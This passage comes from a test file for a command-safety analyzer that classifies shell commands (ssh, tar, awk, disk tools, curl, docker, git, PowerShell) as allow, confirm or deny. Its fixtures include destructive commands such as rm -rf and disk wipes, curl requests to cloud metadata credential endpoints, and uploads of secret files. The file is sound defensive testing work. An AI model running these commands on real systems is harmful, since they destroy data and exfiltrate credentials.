  assert.ok(empty.gaps.includes('stdin-source'))
})

test('multiple heredoc bodies feed one stdin script in order', () => {
  const result = command('bash', [], {
    heredocs: [{ operator: '<<', body: 'echo a\n' }, { operator: '<<-', body: 'echo b\n' }],
  })
  assert.equal(result.children[0].source.text, 'echo a\n\necho b\n')
})

// --- ssh remote payloads ---------------------------------------------------------

test('ssh remote payload is analyzed as one POSIX shell text in the ssh domain', () => {
  const direct = command('ssh', ['host', 'rm', '-rf', '/srv/x'])
  assert.equal(direct.children[0].source.kind, 'inline')
  assert.equal(direct.children[0].source.text, 'rm -rf /srv/x')
  assert.equal(direct.children[0].language, 'posix')
  assert.deepEqual(direct.children[0].context, { domain: 'ssh', platform: 'linux' })
  const quoted = command('ssh', ['host', 'rm -rf /srv/x'])
  assert.equal(quoted.children[0].source.text, 'rm -rf /srv/x')
  const git = command('ssh', ['-p', '22', 'user@host', 'git reset --hard'])
  assert.equal(git.children[0].source.text, 'git reset --hard')
  const options = command('ssh', ['-i', 'id_ed25519', '-o', 'BatchMode=yes', 'host', 'ls'])
  assert.equal(options.children[0].source.text, 'ls')
})

test('ssh heredoc to a POSIX shell receiver analyzes the body in the ssh domain', () => {
  const result = command('ssh', ['host', 'bash'], { heredocs: [{ operator: '<<', body: 'rm -rf /x\n' }] })
  assert.equal(result.children[0].source.text, 'rm -rf /x\n')
  assert.equal(result.children[0].language, 'bash')
  assert.deepEqual(result.children[0].context, { domain: 'ssh', platform: 'linux' })
  const sh = command('ssh', ['host', 'sh'], { heredocs: [{ operator: '<<', body: 'rm -rf /x\n' }] })
  assert.equal(sh.children[0].language, 'posix')
})

test('ssh without a remote command and unmodeled options stay gaps', () => {
  for (const args of [['host'], ['-V'], ['-p'], ['-p', '22'], [null], ['host', 'rm', null, '/x']]) {
    const result = command('ssh', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
    assert.ok(result.gaps.includes('unmodeled-command'), JSON.stringify(args))
  }
})

test('ssh-keygen and version probes never produce candidates', () => {
  const keygen = command('ssh-keygen', ['-l'])
  assert.deepEqual(keygen.operations, [])
  assert.deepEqual(keygen.candidates, [])
  assert.ok(keygen.gaps.includes('unmodeled-command'))
  const version = command('ssh', ['-V'])
  assert.deepEqual(version.candidates, [])
})

// --- tar --remove-files -----------------------------------------------------------

test('tar --remove-files deletes the archived source members', () => {
  const dir = command('tar', ['--remove-files', '-czf', 'out.tgz', 'src/'])
  assert.equal(dir.operations[0].action, 'delete')
  assert.deepEqual(dir.operations[0].target, { kind: 'subtree', root: 'src/' })
  assert.equal(dir.operations[0].recursive, true)
  const oldStyle = command('tar', ['cf', 'out.tgz', 'src/', '--remove-files'])
  assert.deepEqual(oldStyle.operations[0].target, { kind: 'subtree', root: 'src/' })
  const files = command('tar', ['--remove-files', '--file=out.tgz', 'a.txt', 'b.txt'])
  assert.deepEqual(files.operations.map((entry) => entry.target), [
    { kind: 'exact', paths: ['a.txt'] },
    { kind: 'exact', paths: ['b.txt'] },
  ])
  const withDirectory = command('tar', ['--remove-files', '-C', '/tmp', '-cf', 'out.tgz', 'x'])
  // DSR-031 决定 4: `-C` relocates the member base, so the target is the resolved path.
  assert.deepEqual(withDirectory.operations[0].target, { kind: 'exact', paths: ['/tmp/x'] })
  const dynamic = command('tar', ['--remove-files', '-czf', 'out.tgz', null])
  assert.equal(dynamic.operations[0].target.kind, 'unknown')
})

test('tar without --remove-files or with an external member list never deletes', () => {
  const plain = command('tar', ['-czf', 'out.tgz', 'src/'])
  assert.deepEqual(plain.operations, [])
  assert.deepEqual(plain.candidates, [])
  assert.ok(plain.gaps.includes('unmodeled-command'))
  const list = command('tar', ['-tzf', 'out.tgz'])
  assert.deepEqual(list.operations, [])
  assert.ok(list.gaps.includes('unmodeled-command'))
  const fromFile = command('tar', ['--remove-files', '-T', 'list.txt'])
  assert.deepEqual(fromFile.operations, [])
  assert.equal(fromFile.candidates[0].kind, 'unverified-effect')
  const noMembers = command('tar', ['--remove-files', '-cf', 'out.tgz'])
  assert.deepEqual(noMembers.operations, [])
  assert.deepEqual(noMembers.candidates, [])
  assert.ok(noMembers.gaps.includes('command-options'))
})

// --- awk system() ------------------------------------------------------------------

test('awk system() string literals are analyzed as same-domain shell text', () => {
  const literal = command('awk', ['BEGIN{system("rm -rf /tmp/x")}'])
  assert.ok(literal.gaps.includes('unmodeled-command'))
  assert.deepEqual(literal.candidates, [])
  assert.equal(literal.children[0].source.text, 'rm -rf /tmp/x')
  assert.equal(literal.children[0].language, 'posix')
  assert.equal(literal.children[0].context.domain, 'host')
  const escaped = command('awk', ['BEGIN{system("rm -rf \\"/tmp/x\\",\\"/tmp/y\\"")}'])
  assert.equal(escaped.children[0].source.text, 'rm -rf "/tmp/x","/tmp/y"')
  const withFile = command('awk', ['-F:', '{print $1; system("rm -rf /tmp/x")}', '/etc/passwd'])
  assert.equal(withFile.children[0].source.text, 'rm -rf /tmp/x')
})

test('awk dynamic system() arguments become dynamic-execution candidates', () => {
  for (const program of ['BEGIN{system($0)}', 'BEGIN{system("rm -rf " dir)}', 'BEGIN{system(cmd)}']) {
    const result = command('awk', [program])
    assert.equal(result.children.length, 0, program)
    assert.equal(result.candidates[0].kind, 'dynamic-execution', program)
  }
})

test('ordinary awk usage stays a gap without candidates or children', () => {
  for (const args of [['{print $1}'], ['-F:', '{print $1}', '/etc/passwd'], ['-f', 'prog.awk'], ['BEGIN{print "system(x)"}']]) {
    const result = command('awk', args)
    assert.deepEqual(result.children, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
    assert.ok(result.gaps.includes('unmodeled-command'), JSON.stringify(args))
  }
})

// --- raw storage erase / partition tools --------------------------------------------

test('erase and partition tools report the device path for the identity probes', () => {
  const parted = command('parted', ['-s', '/dev/sda', 'mklabel', 'gpt'])
  assert.equal(parted.operations[0].action, 'write-content')
  assert.deepEqual(parted.operations[0].target, { kind: 'exact', paths: ['/dev/sda'] })
  assert.deepEqual(parted.operations[0].details, { deviceMutation: true })
  assert.deepEqual(command('parted', ['/dev/sda', 'rm', '1']).operations[0].target, { kind: 'exact', paths: ['/dev/sda'] })
  assert.deepEqual(command('sgdisk', ['-Z', '/dev/sda']).operations[0].target, { kind: 'exact', paths: ['/dev/sda'] })
  assert.deepEqual(command('sgdisk', ['--zap-all', '/dev/sda']).operations[0].target, { kind: 'exact', paths: ['/dev/sda'] })
  assert.deepEqual(command('sgdisk', ['-c', '1:Name', '/dev/sda']).operations[0].target, { kind: 'exact', paths: ['/dev/sda'] })
  assert.deepEqual(command('fdisk', ['/dev/sda']).operations[0].target, { kind: 'exact', paths: ['/dev/sda'] })
  assert.deepEqual(command('blkdiscard', ['-s', '-o', '4096', '/dev/nvme0n1']).operations[0].target, { kind: 'exact', paths: ['/dev/nvme0n1'] })
  const devDisk = command('diskutil', ['eraseDisk', 'APFS', 'X', '/dev/disk4'])
  assert.deepEqual(devDisk.operations[0].target, { kind: 'exact', paths: ['/dev/disk4'] })
  assert.deepEqual(devDisk.operations[0].details, { deviceMutation: true })
})

test('a diskN identifier that cannot map to a host device path denies instead of allowing', () => {
  const bare = command('diskutil', ['eraseDisk', 'APFS', 'X', 'disk4'])
  assert.equal(bare.operations[0].action, 'write-content')
  assert.equal(bare.operations[0].target.kind, 'unknown')
  assert.equal(bare.operations[0].target.reason, 'storage-selector')
  assert.equal(bare.candidates[0].kind, 'unverified-effect')
  assert.equal(bare.candidates[0].knownScope, undefined)
})

test('an unprovable storage selector becomes an unverified-effect candidate', () => {
  for (const [name, args] of [
    ['diskutil', ['eraseDisk', 'JHFS+', 'Empty']],
    ['parted', ['mklabel', 'gpt']],
    ['sgdisk', ['-Z']],
    ['blkdiscard', []],
  ]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], `${name} ${JSON.stringify(args)}`)
    assert.equal(result.candidates[0].kind, 'unverified-effect', `${name} ${JSON.stringify(args)}`)
  }
  const preview = command('diskutil', ['eraseDisk', '--dryrun', 'JHFS+', 'Empty', 'disk2'])
  assert.deepEqual(preview.operations, [])
  assert.deepEqual(preview.candidates, [])
})

test('read-only storage tool usage stays a gap without candidates', () => {
  for (const [name, args] of [
    ['diskutil', ['list']],
    ['diskutil', ['info', 'disk0s2']],
    ['parted', ['-l']],
    ['parted', ['/dev/sda', 'print']],
    ['sgdisk', ['-p', '/dev/sda']],
    ['sgdisk', ['-p']],
    ['fdisk', ['-l']],
    ['fdisk', ['-l', '/dev/sda']],
  ]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], `${name} ${JSON.stringify(args)}`)
    assert.deepEqual(result.candidates, [], `${name} ${JSON.stringify(args)}`)
    assert.ok(result.gaps.includes('unmodeled-command'), `${name} ${JSON.stringify(args)}`)
  }
})

test('a proven device identity denies the erase (catastrophic.device)', async () => {
  const deviceOp = command('sgdisk', ['-Z', '/dev/sda']).operations[0]
  const decision = await decide(
    {
      analysisStatus: 'complete',
      operations: deviceOp ? [deviceOp] : [],
      candidates: [], gaps: [],
      identities: [{ ruleId: 'catastrophic.device', path: '/dev/sda', action: 'write-content' }],
      inventory: null, protectedHits: [], exemptions: [], issues: [],
    },
    {},
  )
  assert.equal(decision.kind, 'deny')
  assert.equal(decision.ruleId, 'catastrophic.device')
})

test('an unresolvable storage selector denies through the candidate (never allows)', async () => {
  const bare = command('diskutil', ['eraseDisk', 'APFS', 'X', 'disk4'])
  const decision = await decideOperations(bare.operations, bare.candidates)
  assert.equal(decision.kind, 'deny')
  assert.equal(decision.ruleId, 'execution.unverified-effect')
  const missing = command('sgdisk', ['-Z'])
  const missingDecision = await decideOperations(missing.operations, missing.candidates)
  assert.equal(missingDecision.kind, 'deny')
  assert.equal(missingDecision.ruleId, 'execution.unverified-effect')
})

// --- DSR-031 决定 1: ssh / wsl heredoc stdin scripts --------------------------------

test('a bare ssh host with a heredoc feeds the remote shell its stdin script', () => {
  const result = command('ssh', ['host'], { heredocs: [{ operator: '<<', body: 'rm -rf /srv/data\n' }] })
  assert.deepEqual(result.children[0].source, { kind: 'inline', text: 'rm -rf /srv/data\n' })
  assert.equal(result.children[0].language, 'posix')
  assert.deepEqual(result.children[0].context, { domain: 'ssh', platform: 'linux' })
  assert.deepEqual(result.operations, [])
  assert.deepEqual(result.candidates, [])
  assert.deepEqual(result.gaps, [])
  // No command AND no heredoc keeps the coverage-gap allowance.
  const bare = command('ssh', ['host'])
  assert.deepEqual(bare.children, [])
  assert.deepEqual(bare.operations, [])
  assert.deepEqual(bare.gaps, ['unmodeled-command'])
  // A receiver-form heredoc still uses the receiver's dialect.
  const bash = command('ssh', ['host', 'bash'], { heredocs: [{ operator: '<<', body: 'rm -rf /x\n' }] })
  assert.equal(bash.children[0].language, 'bash')
  assert.equal(bash.children[0].source.text, 'rm -rf /x\n')
})

test('a wsl shell receiver reads the call heredoc as its stdin script', () => {
  for (const args of [['bash'], ['bash', '-s'], ['-e', 'bash'], ['--', 'bash']]) {
    const result = command('wsl', args, { ...win32Unit, heredocs: [{ operator: '<<', body: 'rm -rf /home/u/x\n' }] })
    assert.deepEqual(result.children[0].source, { kind: 'inline', text: 'rm -rf /home/u/x\n' }, JSON.stringify(args))
    assert.equal(result.children[0].language, 'bash', JSON.stringify(args))
    assert.equal(result.children[0].context.domain, 'wsl', JSON.stringify(args))
    assert.equal(result.children[0].context.platform, 'linux', JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
  // `-c` and a script file displace the stdin script: the heredoc stays data.
  const inline = command('wsl', ['bash', '-c', 'echo hi'], { ...win32Unit, heredocs: [{ operator: '<<', body: 'rm -rf /home/u/x\n' }] })
  assert.equal(inline.children[0].source.kind, 'argv')
  const script = command('wsl', ['bash', 'script.sh'], { ...win32Unit, heredocs: [{ operator: '<<', body: 'rm -rf /home/u/x\n' }] })
  assert.equal(script.children[0].source.kind, 'argv')
})

// --- DSR-031 决定 2: ssh PowerShell / cmd channels ----------------------------------

test('ssh PowerShell and cmd receivers become dialect sub-units inside the ssh domain', () => {
  const powershell = command('ssh', ['host', 'powershell', '-Command', 'Remove-Item -Recurse -Force C:\\data'])
  assert.equal(powershell.children[0].language, 'powershell')
  assert.deepEqual(powershell.children[0].source, { kind: 'inline', text: 'Remove-Item -Recurse -Force C:\\data' })
  // The sub-unit carries ONLY the ssh domain: a win32 platform would change rm semantics.
  assert.deepEqual(powershell.children[0].context, { domain: 'ssh' })
  assert.equal(powershell.children[0].context.platform, undefined)
  const pwsh = command('ssh', ['host', 'pwsh', '-c', 'rm -rf /x'])
  assert.equal(pwsh.children[0].language, 'powershell')
  assert.equal(pwsh.children[0].source.text, 'rm -rf /x')
  const cmd = command('ssh', ['host', 'cmd.exe', '/c', 'del /s /q C:\\data'])
  assert.equal(cmd.children[0].language, 'cmd')
  assert.deepEqual(cmd.children[0].source, { kind: 'inline', text: 'del /s /q C:\\data' })
  assert.deepEqual(cmd.children[0].context, { domain: 'ssh' })
  // A cmd receiver without a provable payload stays a coverage gap (never a candidate).
  const bare = command('ssh', ['host', 'cmd'])
  assert.deepEqual(bare.children, [])
  assert.deepEqual(bare.candidates, [])
  assert.ok(bare.gaps.includes('cmd-inline'))
  // `--help`/lookup forms of the receivers produce no operation.
  for (const args of [['host', 'ls'], ['host', 'df', '-h']]) {
    const result = command('ssh', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
})

// --- DSR-031 决定 7: unshare is a transparent wrapper ------------------------------

test('unshare unwraps to the inner program without adding facts or candidates', () => {
  for (const args of [
    ['--mount', 'bash', '-c', 'rm -rf /srv/x'],
    ['-r', 'bash', '-c', 'rm -rf /srv/x'],
    ['-rm', 'bash', '-c', 'rm -rf /srv/x'],
    ['-w', '/tmp', 'bash', '-c', 'rm -rf /srv/x'],
    ['--user', '--map-root-user', 'bash', '-c', 'rm -rf /srv/x'],
    ['--', 'bash', '-c', 'rm -rf /srv/x'],
  ]) {
    const result = command('unshare', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
    assert.equal(result.children[0].source.text, 'rm -rf /srv/x', JSON.stringify(args))
    assert.equal(result.children[0].language, 'bash', JSON.stringify(args))
  }
  // No program operand and unmodeled options are plain gaps (D5: never a candidate).
  for (const args of [['--mount'], ['--user', '--map-root-user', 'id'], ['--unknown-option', 'rm', '-rf', '/x'],
    ['-Z', 'bash', '-c', 'rm -rf /x']]) {
    const result = command('unshare', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
    assert.deepEqual(result.children.filter((child) => child.source.kind !== 'argv'), [], JSON.stringify(args))
    assert.ok(result.gaps.includes('unmodeled-command'), JSON.stringify(args))
  }
  // Help/version never run the trailing words (D3), even when one looks destructive.
  const help = command('unshare', ['--help', 'rm', '-rf', '/x'])
  assert.deepEqual(help.operations, [])
  assert.deepEqual(help.candidates, [])
  assert.ok(help.gaps.includes('unmodeled-command'))
  // A dynamic inner program is a gap, not a candidate.
  const dynamic = command('unshare', [null, 'rm', '-rf', '/x'])
  assert.deepEqual(dynamic.operations, [])
  assert.deepEqual(dynamic.candidates, [])
})

// --- DSR-031 决定 6: outbound transfer surface -------------------------------------

test('cloud metadata endpoint access becomes an unverified-effect candidate', () => {
  for (const [name, args, host] of [
    ['curl', ['http://169.254.169.254/latest/meta-data/iam/security-credentials/'], '169.254.169.254'],
    ['curl', ['-s', 'http://[fd00:ec2::254]/latest/meta-data/'], 'fd00:ec2::254'],
    ['wget', ['http://metadata.google.internal/computeMetadata/v1/'], 'metadata.google.internal'],
    ['wget', ['-q', 'http://100.100.100.200/latest/meta-data/'], '100.100.100.200'],
    ['curl', ['http://169.254.170.2/v2/credentials'], '169.254.170.2'],
    ['curl', ['http://169.254.170.23/v1/credentials'], '169.254.170.23'],
    ['curl', ['http://[fd00:ec2::23]/v1/credentials'], 'fd00:ec2::23'],
    ['curl', ['http://metadata.goog/computeMetadata/v1/'], 'metadata.goog'],
    // A port never changes the endpoint identity.
    ['curl', ['http://169.254.169.254:80/latest/meta-data/'], '169.254.169.254'],
  ]) {
    const result = command(name, args)
    assert.equal(result.candidates.length, 1, JSON.stringify(args))
    assert.equal(result.candidates[0].kind, 'unverified-effect', JSON.stringify(args))
    assert.deepEqual(result.candidates[0].knownScope, [`${host} (cloud instance metadata)`], JSON.stringify(args))
    assert.deepEqual(result.operations, [], JSON.stringify(args))
  }
})

test('ordinary downloads stay free: no candidates and no operations', () => {
  for (const [name, args] of [
    ['curl', ['https://example.com']],
    ['curl', ['-o', 'out.txt', 'https://example.com/a']],
    ['curl', ['-sS', '-X', 'POST', '--data', 'k=v', 'https://example.com/api']],
    ['wget', ['https://example.com/x.tgz']],
    ['wget', ['-O', 'out.txt', 'https://example.com/x.tgz']],
  ]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
})

test('curl and wget local upload sources become read-content facts', () => {
  const curlCases = [
    [['-T', '.env', 'https://example.com/u'], '.env'],
    [['--upload-file', 'secrets.txt', 'https://example.com/u'], 'secrets.txt'],
    [['-T.env', 'https://example.com/u'], '.env'],
    [['--data', '@/tmp/payload.json', 'https://example.com/u'], '/tmp/payload.json'],
    [['-d@/tmp/b.txt', 'https://example.com/u'], '/tmp/b.txt'],
    [['--data-binary', '@/tmp/c.bin', 'https://example.com/u'], '/tmp/c.bin'],
    [['--data-raw', '@/tmp/d.txt', 'https://example.com/u'], '/tmp/d.txt'],
    [['--data-urlencode', '@/tmp/e.txt', 'https://example.com/u'], '/tmp/e.txt'],
    [['-F', 'field=@/tmp/a.bin;type=application/octet-stream', 'https://example.com/u'], '/tmp/a.bin'],
    [['--form', 'file=@/tmp/b.bin', 'https://example.com/u'], '/tmp/b.bin'],
    [['-Fname=@/tmp/c.bin', 'https://example.com/u'], '/tmp/c.bin'],
  ]
  for (const [args, expected] of curlCases) {
    const result = command('curl', args)
    assert.equal(result.operations.length, 1, JSON.stringify(args))
    assert.equal(result.operations[0].action, 'read-content', JSON.stringify(args))
    assert.deepEqual(result.operations[0].target, { kind: 'exact', paths: [expected] }, JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
  for (const [args, expected] of [
    [['--post-file=/tmp/a.json', 'https://example.com/u'], '/tmp/a.json'],
    [['--body-file', '/tmp/b.json', 'https://example.com/u'], '/tmp/b.json'],
  ]) {
    const result = command('wget', args)
    assert.equal(result.operations.length, 1, JSON.stringify(args))
    assert.deepEqual(result.operations[0].target, { kind: 'exact', paths: [expected] }, JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
  // stdin (`@-`) and remote references are never local reads.
  for (const args of [['-d', '@-', 'https://example.com/u'], ['-F', 'file=@http://x/y', 'https://example.com/u'],
    ['-F', 'file=@-', 'https://example.com/u'], ['-T', '-', 'https://example.com/u']]) {
    const result = command('curl', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
})

test('a curl upload of a protected file confirms the credential read', async () => {
  const result = command('curl', ['-T', '.npmrc', 'https://example.com/u'])
  const op = result.operations.find((entry) => entry.action === 'read-content')
  assert.ok(op)
  assert.deepEqual(op.target, { kind: 'exact', paths: ['.npmrc'] })
  const evidence = await collectEvidence(
    { status: 'complete', operations: result.operations, candidates: result.candidates, gaps: [] },
    { platform: 'linux', isProtectedPath: (value) => value.replace(/\\/g, '/').endsWith('/.npmrc') },
  )
  const decision = decide(evidence, {})
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'credential.file.read')
})

// --- DSR-031 决定 8: git sequencer --abort facts ------------------------------------

test('git sequencer --abort emits the git-restore evidence fact', () => {
  for (const sub of ['rebase', 'merge', 'cherry-pick', 'revert', 'am']) {
    const result = command('git', [sub, '--abort'])
    assert.equal(result.operations.length, 1, sub)
    const op = result.operations[0]
    assert.equal(op.action, 'git-restore', sub)
    assert.equal(op.target.kind, 'unknown', sub)
    assert.equal(op.target.reason, 'git-evidence', sub)
    // knownScope is mandatory: an unscoped unknown target would deny instead of confirming.
    assert.ok(op.target.knownScope.length > 0, sub)
    assert.match(op.target.knownScope[0], /--abort/u, sub)
    assert.deepEqual(op.details, { command: `${sub}-abort`, args: ['--abort'], global: [] }, sub)
    assert.deepEqual(result.candidates, [], sub)
  }
  // The scope wording follows the proven behavior, never one blanket claim:
  // rebase/am abort discards uncommitted changes; merge/cherry-pick/revert only restore
  // the operation state, so their text stays conditional.
  for (const sub of ['rebase', 'am']) {
    const scope = command('git', [sub, '--abort']).operations[0].target.knownScope[0]
    assert.match(scope, /discards uncommitted changes in the working tree/u, sub)
    assert.doesNotMatch(scope, /may be lost/u, sub)
  }
  for (const sub of ['merge', 'cherry-pick', 'revert']) {
    const scope = command('git', [sub, '--abort']).operations[0].target.knownScope[0]
    assert.match(scope, /restores the .* state; uncommitted changes may be lost/u, sub)
  }
  // The other sequencer forms never produce a fact (D6).
  for (const args of [['rebase', '--continue'], ['rebase', '--skip'], ['rebase', '--quit'],
    ['merge', '--ff-only', 'main'], ['cherry-pick', '--continue'], ['am', '--skip'], ['status'],
    ['rebase'], ['merge', 'main'], ['abort']]) {
    assert.deepEqual(command('git', args).operations, [], JSON.stringify(args))
  }
  // A sequencer abort in the ssh domain keeps the same fact shape.
  const remote = command('git', ['rebase', '--abort'], { context: { domain: 'ssh', platform: 'linux' } })
  assert.equal(remote.operations[0].action, 'git-restore')
  assert.ok(remote.operations[0].target.knownScope.length > 0)
})


// --- DSR-031 决定 9: PowerShell pipeline deletion ---------------------------------

test('PowerShell pipeline deletion confirms on the pipeline input scope', async () => {
  const { analysis, decision } = await evaluatePipeline('Get-ChildItem . | Remove-Item -Force', { language: 'powershell' })
  const operation = analysis.operations.find((entry) => entry.action === 'delete')
  assert.ok(operation, `expected a delete operation, got ${JSON.stringify(analysis.operations)}`)
  assert.deepEqual(operation.target, {
    kind: 'unknown',
    reason: 'pipeline-input',
    knownScope: ['pipeline input of `Get-ChildItem .`'],
  })
  assert.equal(operation.preview, false)
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'data.delete.dynamic')
})

test('PowerShell pipeline deletion respects -WhatIf and explicit paths', async () => {
  const preview = await evaluatePipeline('Get-ChildItem . | Remove-Item -Force -WhatIf', { language: 'powershell' })
  assert.deepEqual(preview.analysis.operations.filter((entry) => entry.action === 'delete'), [],
    '-WhatIf is a preview: no deletion operation')
  assert.deepEqual(preview.analysis.candidates, [])
  assert.equal(preview.decision.kind, 'allow')

  const explicit = await evaluatePipeline('Remove-Item -LiteralPath a.txt', { language: 'powershell' })
  const operation = explicit.analysis.operations.find((entry) => entry.action === 'delete')
  assert.ok(operation)
  assert.deepEqual(operation.target, { kind: 'exact', paths: ['a.txt'] })
  assert.equal(explicit.decision.kind, 'allow')
})

test('pipeline-fed delete names the adjacent upstream command', async () => {
  const { analysis, decision } = await evaluatePipeline('Get-Content x | Remove-Item', { language: 'powershell' })
  const operation = analysis.operations.find((entry) => entry.action === 'delete')
  assert.ok(operation)
  assert.deepEqual(operation.target, {
    kind: 'unknown',
    reason: 'pipeline-input',
    knownScope: ['pipeline input of `Get-Content x`'],
  })
  assert.equal(decision.kind, 'confirm')
})

// --- DSR-031 决定 10: docker run/exec payloads ------------------------------------

test('docker run with a host bind mount analyzes the payload in the container domain', async () => {
  const { analysis, decision } = await evaluatePipeline("docker run --rm -v /srv:/mnt alpine sh -c 'rm -rf /mnt/x'")
  const operation = analysis.operations.find((entry) => entry.action === 'delete')
  assert.ok(operation, `expected a delete operation, got ${JSON.stringify(analysis.operations)}`)
  assert.equal(operation.context.domain, 'container')
  assert.equal(operation.target.kind, 'unknown')
  assert.ok(operation.target.knownScope.length > 0)
  assert.deepEqual(analysis.candidates, [])
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'data.delete.dynamic')
})

test('docker run --privileged and --mount binds confirm the payload deletion', async () => {
  for (const text of [
    "docker run --rm --privileged alpine sh -c 'rm -rf /data'",
    "docker run --rm --mount type=bind,source=/srv,target=/mnt alpine sh -c 'rm -rf /mnt/x'",
  ]) {
    const { analysis, decision } = await evaluatePipeline(text)
    const operation = analysis.operations.find((entry) => entry.action === 'delete')
    assert.ok(operation, text)
    assert.equal(decision.kind, 'confirm', text)
    assert.equal(decision.ruleId, 'data.delete.dynamic', text)
  }
})

test('docker --device device writes stay visible and never allow silently', async () => {
  const { analysis, decision } = await evaluatePipeline("docker run --rm --device /dev/sdb alpine sh -c 'wipefs -a /dev/sdb'")
  const operation = analysis.operations.find((entry) => entry.action === 'write-content')
  assert.ok(operation, `expected a write-content fact, got ${JSON.stringify(analysis.operations)}`)
  assert.deepEqual(operation.target, { kind: 'exact', paths: ['/dev/sdb'] })
  assert.equal(operation.context.domain, 'container')
  assert.notEqual(decision.kind, 'allow')
})

test('docker run without host exposure stays allow with no facts', async () => {
  for (const text of [
    "docker run --rm alpine sh -c 'rm -rf /tmp/x'",
    "docker run --rm -v vol:/data alpine sh -c 'rm -rf /data/x'",
    'docker ps',
  ]) {
    const { analysis, decision } = await evaluatePipeline(text)
    assert.deepEqual(analysis.operations, [], text)
    assert.deepEqual(analysis.candidates, [], text)
    assert.equal(decision.kind, 'allow', text)
  }
})

// --- DSR-031 决定 4: tar -C member relocation -------------------------------------

test('tar -C relocates --remove-files member resolution cumulatively', () => {
  const absolute = command('tar', ['-C', '/srv', '--remove-files', '-cf', 'out.tar', 'data'])
  assert.deepEqual(absolute.operations[0].target, { kind: 'exact', paths: ['/srv/data'] })
  const chained = command('tar', ['-C', '/srv', '-C', 'sub', '--remove-files', '-cf', 'out.tar', 'data'])
  assert.deepEqual(chained.operations[0].target, { kind: 'exact', paths: ['/srv/sub/data'] })
  const longForm = command('tar', ['--directory=/srv', '--remove-files', '--file=out.tar', 'data'])
  assert.deepEqual(longForm.operations[0].target, { kind: 'exact', paths: ['/srv/data'] })
})

test('tar -C with an unprovable directory keeps a non-empty known scope', () => {
  const dynamic = command('tar', ['-C', null, '--remove-files', '-cf', 'o.tar', 'data'])
  assert.equal(dynamic.operations[0].target.kind, 'unknown')
  assert.ok(dynamic.operations[0].target.knownScope.length > 0)
  const noCwd = command('tar', ['-C', 'relative', '--remove-files', '-cf', 'o.tar', 'data'], {
    context: { domain: 'host', platform: 'linux' },
  })
  assert.equal(noCwd.operations[0].target.kind, 'unknown')
  assert.ok(noCwd.operations[0].target.knownScope.length > 0)
})

test('tar without --remove-files produces no deletion fact after -C parsing', () => {
  for (const args of [['-tzf', 'out.tgz'], ['-czf', 'out.tgz', '-C', 'src', '.']]) {
    const result = command('tar', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
})

// --- DSR-031 决定 4: archive-then-delete: 7z -sdel / zip -m -----------------------

test('7z -sdel and zip -m delete their archived sources', () => {
  for (const [name, args] of [
    ['7z', ['a', '-sdel', 'out.7z', 'data.txt']],
    ['7z', ['a', '-SDeL', 'out.7z', 'data.txt']],
    ['zip', ['-m', 'out.zip', 'data.txt']],
    ['zip', ['--move', 'out.zip', 'data.txt']],
  ]) {
    const result = command(name, args)
    assert.deepEqual(result.operations.map((entry) => entry.target), [{ kind: 'exact', paths: ['data.txt'] }], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
  const recursive = command('zip', ['-mr', 'out.zip', 'src/'])
  assert.deepEqual(recursive.operations[0].target, { kind: 'subtree', root: 'src/' })
  // 7-Zip recurses into an archived directory by default and keeps the member
  // path exact; the evidence layer counts a file as one entry and walks a directory.
  const sevenRecursive = command('7z', ['a', '-r', '-sdel', 'out.7z', 'src/'])
  assert.deepEqual(sevenRecursive.operations[0].target, { kind: 'exact', paths: ['src/'] })
  assert.equal(sevenRecursive.operations[0].recursive, true)
})

test('archive tools without a move/delete switch stay fact-free', () => {
  for (const [name, args] of [['7z', ['a', 'out.7z', 'data.txt']], ['zip', ['-r', 'out.zip', 'src']]]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
})

test('archive member deletions with unprovable members keep a non-empty known scope', () => {
  const dynamic = command('zip', ['-m', 'out.zip', null])
  assert.equal(dynamic.operations[0].target.kind, 'unknown')
  assert.ok(dynamic.operations[0].target.knownScope.length > 0)
  const wildcard = command('7z', ['a', '-sdel', 'out.7z', '*.log'])
  assert.equal(wildcard.operations[0].target.kind, 'unknown')
  assert.ok(wildcard.operations[0].target.knownScope.length > 0)
})

// --- DSR-031 决定 3: sgdisk / parted partition-table writes -----------------------

test('sgdisk write subcommands consume their values and target the device', () => {
  for (const args of [
    ['-d', '1', '/dev/sda'],
    ['-n', '1:2048:4096', '/dev/sda'],
    ['-t', '1:8300', '/dev/sda'],
    ['-t1:8300', '/dev/sda'],
    ['-A', '1:set:2', '/dev/sda'],
    ['-c', '1:name', '/dev/sda'],
    ['--typecode=1:8300', '/dev/sda'],
    ['-o', '/dev/sda'],
    ['--clear', '/dev/sda'],
  ]) {
    const result = command('sgdisk', args)
    assert.equal(result.operations[0]?.action, 'write-content', JSON.stringify(args))
    assert.deepEqual(result.operations[0]?.target, { kind: 'exact', paths: ['/dev/sda'] }, JSON.stringify(args))
    assert.deepEqual(result.operations[0]?.details, { deviceMutation: true }, JSON.stringify(args))
  }
})

test('sgdisk -P is a dry-run and -p stays read-only', () => {
